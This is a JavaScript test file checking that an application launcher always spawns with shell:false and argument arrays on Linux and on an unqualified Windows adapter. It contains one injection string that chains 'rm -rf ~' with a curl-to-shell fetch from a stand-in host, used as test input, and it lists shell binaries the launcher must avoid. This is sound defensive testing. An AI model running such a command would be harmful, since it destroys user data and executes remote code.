// applicationLauncher.js — argument arrays, always.
//
// THE ASSERTION THAT MATTERS is `every launch passes shell: false and an args
// ARRAY`, run over every launch method and over an entry whose every field is
// packed with shell metacharacters. It is written as a loop over the methods
// rather than as one example so that adding a method without adding an argv
// contract fails here, and it asserts on the spawn OPTIONS rather than on the
// resulting behaviour because "it happened not to break this time" is not the
// property being claimed.
//
// The Windows adapter is exercised with the same contract and asserted to carry
// its own `qualified: false` — a plan that looks correct and has never been run
// on a Windows machine must say so in the object, not only in a comment.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import launcherModule from '../src/main/applicationLauncher.js';

const {
  createApplicationLauncher,
  resolveLaunchPlan,
  resolveWindowsLaunchPlan,
  chooseMethod,
  DESKTOP_LAUNCH_COMMAND,
  FLATPAK_COMMAND,
  OPEN_COMMAND,
  FOCUS_COMMAND,
  WINDOWS_OPEN_COMMAND,
  WINDOWS_UNQUALIFIED_REASON,
  STEP_STATUS_CODES,
} = launcherModule;

function entry(extra = {}) {
  return { id: 'app', display_name: 'App', confirmed: true, ...extra };
}

/** A spawn double that records exactly how it was called. */
function recorder({ throws = null } = {}) {
  const calls = [];
  const spawn = (command, args, options) => {
    calls.push({ command, args, options });
    if (throws) throw throws;
    return { unref() {}, on() {} };
  };
  return { calls, spawn };
}

const ALL_METHODS = [
  ['desktop_entry', entry({ launch_method: 'desktop_entry', desktop_entry: 'obsidian.desktop' }),
    DESKTOP_LAUNCH_COMMAND, ['obsidian']],
  ['flatpak', entry({ launch_method: 'flatpak', flatpak_id: 'md.obsidian.Obsidian' }),
    FLATPAK_COMMAND, ['run', 'md.obsidian.Obsidian']],
  ['uri', entry({ launch_method: 'uri', uri: 'obsidian://open' }),
    OPEN_COMMAND, ['obsidian://open']],
  ['executable', entry({ launch_method: 'executable', executable: '/usr/bin/obsidian' }),
    '/usr/bin/obsidian', []],
  ['steam', entry({ launch_method: 'steam', steam_uri: 'steam://rungameid/252950' }),
    OPEN_COMMAND, ['steam://rungameid/252950']],
];

// --- plans --------------------------------------------------------------------

test('each launch method resolves to its exact command and argument array', () => {
  for (const [name, e, command, args] of ALL_METHODS) {
    const plan = resolveLaunchPlan(e);
    assert.equal(plan.ok, true, name);
    assert.equal(plan.command, command, name);
    assert.deepEqual(plan.args, args, name);
    assert.ok(Array.isArray(plan.args), name);
  }
});

test('an unconfirmed entry has no launch plan at all', () => {
  const plan = resolveLaunchPlan(entry({ confirmed: false, launch_method: 'flatpak', flatpak_id: 'x' }));
  assert.equal(plan.ok, false);
  assert.match(plan.reason, /not been confirmed/);
});

test('an entry with no launch method has no plan', () => {
  const plan = resolveLaunchPlan(entry());
  assert.equal(plan.ok, false);
  assert.deepEqual(plan.args, []);
});

test('the Linux priority order is desktop, flatpak, uri, executable, steam', () => {
  const everything = entry({
    launch_method: '',
    desktop_entry: 'a.desktop',
    flatpak_id: 'com.a.A',
    uri: 'a://x',
    executable: '/usr/bin/a',
    steam_uri: 'steam://rungameid/1',
  });
  assert.equal(chooseMethod(everything), 'desktop_entry');
  assert.equal(chooseMethod({ ...everything, desktop_entry: '' }), 'flatpak');
  assert.equal(chooseMethod({ ...everything, desktop_entry: '', flatpak_id: '' }), 'uri');
  assert.equal(chooseMethod({ ...everything, desktop_entry: '', flatpak_id: '', uri: '' }), 'executable');
  assert.equal(chooseMethod({
    ...everything, desktop_entry: '', flatpak_id: '', uri: '', executable: '',
  }), 'steam');
});

test('an explicitly chosen method wins over the priority order', () => {
  const plan = resolveLaunchPlan(entry({
    launch_method: 'executable',
    desktop_entry: 'a.desktop',
    executable: '/usr/bin/a',
  }));
  assert.equal(plan.method, 'executable');
  assert.equal(plan.command, '/usr/bin/a');
});

test('a chosen method with nothing behind it falls back rather than launching nothing', () => {
  const plan = resolveLaunchPlan(entry({ launch_method: 'flatpak', executable: '/usr/bin/a' }));
  assert.equal(plan.method, 'executable');
});

test('the .desktop suffix is optional and both spellings behave identically', () => {
  const withSuffix = resolveLaunchPlan(entry({ launch_method: 'desktop_entry', desktop_entry: 'a.desktop' }));
  const without = resolveLaunchPlan(entry({ launch_method: 'desktop_entry', desktop_entry: 'a' }));
  assert.deepEqual(withSuffix.args, without.args);
});

// --- the shell rule -----------------------------------------------------------

test('every launch method spawns with shell:false and an args array', () => {
  for (const [name, e] of ALL_METHODS) {
    const { calls, spawn } = recorder();
    createApplicationLauncher({ spawn, platform: 'linux' }).launch(e);
    assert.equal(calls.length, 1, name);
    assert.equal(calls[0].options.shell, false, `${name} must never use a shell`);
    assert.ok(Array.isArray(calls[0].args), `${name} must pass an argv array`);
    assert.equal(typeof calls[0].command, 'string', name);
  }
});

test('shell metacharacters in confirmed fields stay inside a single argument', () => {
  // Not "escaped" — never split at all. If any of these ever appear as their
  // own argv entry, something has started joining and re-splitting a string.
  const nasty = '; rm -rf ~ && curl evil.example | sh';
  const cases = [
    entry({ launch_method: 'executable', executable: `/usr/bin/app${nasty}` }),
    entry({ launch_method: 'flatpak', flatpak_id: `com.a.A${nasty}` }),
    entry({ launch_method: 'desktop_entry', desktop_entry: `a${nasty}.desktop` }),
  ];
  for (const e of cases) {
    const { calls, spawn } = recorder();
    createApplicationLauncher({ spawn, platform: 'linux' }).launch(e);
    const { command, args, options } = calls[0];
    assert.equal(options.shell, false);
    const parts = [command, ...args];
    assert.ok(!parts.includes('rm'), 'no separate rm argument');
    assert.ok(!parts.includes('sh'), 'no separate sh argument');
    assert.ok(!parts.includes('&&'), 'no separate && argument');
    // Everything nasty is inside exactly one string.
    assert.equal(parts.filter((p) => p.includes(nasty)).length, 1);
  }
});

test('the launcher never spawns a shell binary itself', () => {
  for (const [, e] of ALL_METHODS) {
    const { calls, spawn } = recorder();
    createApplicationLauncher({ spawn, platform: 'linux' }).launch(e);
    for (const shell of ['sh', 'bash', 'zsh', '/bin/sh', '/bin/bash', 'cmd.exe', 'powershell.exe']) {
      assert.notEqual(calls[0].command, shell);
    }
  }
});

test('launched applications are detached with stdio ignored', () => {
  const { calls, spawn } = recorder();
  createApplicationLauncher({ spawn, platform: 'linux' }).launch(ALL_METHODS[1][1]);
  assert.equal(calls[0].options.detached, true);
  assert.equal(calls[0].options.stdio, 'ignore');
});

// --- status codes -------------------------------------------------------------

test('a successful spawn reports ok and a refused plan reports refused', () => {
  const { spawn } = recorder();
  const launcher = createApplicationLauncher({ spawn, platform: 'linux' });
  assert.equal(launcher.launch(ALL_METHODS[1][1]).status, 'ok');
  assert.equal(launcher.launch(entry({ confirmed: false })).status, 'refused');
});

test('a missing binary reports not_found, and any other error reports failed', () => {
  const enoent = Object.assign(new Error('nope'), { code: 'ENOENT' });
  const missing = createApplicationLauncher({
    spawn: recorder({ throws: enoent }).spawn, platform: 'linux',
  });
  assert.equal(missing.launch(ALL_METHODS[3][1]).status, 'not_found');

  const other = createApplicationLauncher({
    spawn: recorder({ throws: new Error('EACCES') }).spawn, platform: 'linux',
  });
  assert.equal(other.launch(ALL_METHODS[3][1]).status, 'failed');
});

test('every status this module can return is in the shared vocabulary', () => {
  const { spawn } = recorder();
  const launcher = createApplicationLauncher({ spawn, platform: 'linux' });
  const observed = [
    launcher.launch(ALL_METHODS[0][1]).status,
    launcher.launch(entry({ confirmed: false })).status,
    launcher.open('').status,
    launcher.focus(entry({ executable: '/usr/bin/a' }), { sessionType: 'wayland' }).status,
  ];
  for (const status of observed) assert.ok(STEP_STATUS_CODES.includes(status), status);
});

// --- open / focus -------------------------------------------------------------

test('open hands the target to the platform opener as one argument', () => {
  const { calls, spawn } = recorder();
  createApplicationLauncher({ spawn, platform: 'linux' }).open('https://example.com/a?b=c');
  assert.equal(calls[0].command, OPEN_COMMAND);
  assert.deepEqual(calls[0].args, ['https://example.com/a?b=c']);
  assert.equal(calls[0].options.shell, false);
});

test('focus is honest about Wayland instead of pretending to work', () => {
  const { calls, spawn } = recorder();
  const result = createApplicationLauncher({ spawn, platform: 'linux' })
    .focus(entry({ executable: '/usr/bin/a' }), { sessionType: 'wayland' });
  assert.equal(result.status, 'unavailable');
  assert.equal(calls.length, 0, 'nothing is spawned when the capability is absent');
});

test('focus on X11 uses xdotool with an argument array', () => {
  const { calls, spawn } = recorder();
  createApplicationLauncher({ spawn, platform: 'linux' })
    .focus(entry({ executable: '/usr/bin/obsidian' }), { sessionType: 'x11' });
  assert.equal(calls[0].command, FOCUS_COMMAND);
  assert.deepEqual(calls[0].args, ['search', '--class', 'obsidian', 'windowactivate', '%1']);
  assert.equal(calls[0].options.shell, false);
});

// --- Windows: designed, mockable, honestly unqualified -------------------------

test('the Windows plan carries qualified:false and a reason, for every branch', () => {
  const plans = [
    resolveWindowsLaunchPlan(entry({ executable: 'C:\\Program Files\\App\\app.exe' })),
    resolveWindowsLaunchPlan(entry({ uri: 'obsidian://open' })),
    resolveWindowsLaunchPlan(entry({ steam_uri: 'steam://rungameid/1' })),
    resolveWindowsLaunchPlan(entry({ flatpak_id: 'com.a.A' })),
    resolveWindowsLaunchPlan(entry({ confirmed: false })),
  ];
  for (const plan of plans) {
    assert.equal(plan.qualified, false);
    assert.equal(plan.unqualified_reason, WINDOWS_UNQUALIFIED_REASON);
    assert.ok(Array.isArray(plan.args));
  }
});

test('the Windows plan opens URIs through explorer.exe and runs executables directly', () => {
  assert.equal(resolveWindowsLaunchPlan(entry({ uri: 'obsidian://x' })).command, WINDOWS_OPEN_COMMAND);
  assert.equal(
    resolveWindowsLaunchPlan(entry({ executable: 'C:\\app.exe' })).command,
    'C:\\app.exe',
  );
});

test('a .desktop or flatpak entry has no Windows plan and says why', () => {
  const plan = resolveWindowsLaunchPlan(entry({ flatpak_id: 'com.a.A', desktop_entry: 'a.desktop' }));
  assert.equal(plan.ok, false);
  assert.match(plan.reason, /program path or a link/);
});

test('the Windows launcher still passes shell:false and an args array', () => {
  const { calls, spawn } = recorder();
  const launcher = createApplicationLauncher({ spawn, platform: 'win32' });
  launcher.launch(entry({ uri: 'obsidian://x' }));
  assert.equal(calls[0].command, WINDOWS_OPEN_COMMAND);
  assert.equal(calls[0].options.shell, false);
  assert.ok(Array.isArray(calls[0].args));
  assert.equal(launcher.windowsQualified, false);
});

test('focus is unavailable on Windows and says it is unqualified', () => {
  const result = createApplicationLauncher({ spawn: recorder().spawn, platform: 'win32' })
    .focus(entry({ executable: 'C:\\app.exe' }));
  assert.equal(result.status, 'unavailable');
  assert.equal(result.qualified, false);
});
